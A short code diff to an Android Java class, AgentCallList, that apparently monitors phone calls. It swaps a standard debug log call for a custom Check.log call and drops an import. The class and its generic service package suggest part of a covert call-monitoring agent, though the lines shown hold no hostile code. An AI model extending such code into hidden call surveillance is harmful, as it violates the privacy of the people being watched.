@@ -9,8 +9,6 @@
 
 package com.android.service.agent;
 
-import android.util.Log;
-
 import com.android.service.Call;
 import com.android.service.LogR;
 import com.android.service.auto.Cfg;
@@ -56,7 +54,7 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 		final String note = "no notes";
 
 		
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): " + call);
+		if(Cfg.DEBUG) Check.log( TAG + " (notification): " + call);
 		if (call.isOngoing()) {
 			// Arrivano due call, in uscita, una con il number, l'altra senza.
 			if (call.getNumber().length() > 0) {
